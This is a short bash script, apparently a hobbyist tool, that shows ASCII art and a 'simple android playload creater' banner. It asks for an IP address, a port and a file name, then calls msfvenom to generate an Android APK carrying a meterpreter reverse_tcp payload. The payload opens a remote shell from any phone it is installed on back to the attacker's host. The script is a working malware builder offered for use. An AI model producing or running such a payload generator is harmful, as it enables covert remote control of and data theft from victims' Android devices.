#!/user/bin/bash

echo "          !\_________________________/!\   "
echo "          !!                         !! \  "
echo "          !! simple android playload !!  \ "
echo "          !!        creater          !!  ! "
echo "          !!          Free           !!  ! "
echo "          !!                         !!  ! "
echo "          !!    woking using msfv    !!  ! "
echo "          !!                         !!  ! "
echo "          !!      By: vr369          !!  / "
echo "          !!_________________________!! /  "
echo "         !/_________________________\!/    "
echo "             __\_________________/__/!_    "
echo "            !_______________________!/"
echo "          ________________________"
echo "         /oooo  oooo  oooo  oooo /!"
echo "        /ooooooooooooooooooooooo/ /"
echo "       /ooooooooooooooooooooooo/ /"
echo "      /_______________________/_/"
echo "                                "
echo "enter your ipaddress:"
read ip
echo "enter portnumber:"
read port
echo "enter file name(last add .apk):"
read app

echo $(msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> $app) 
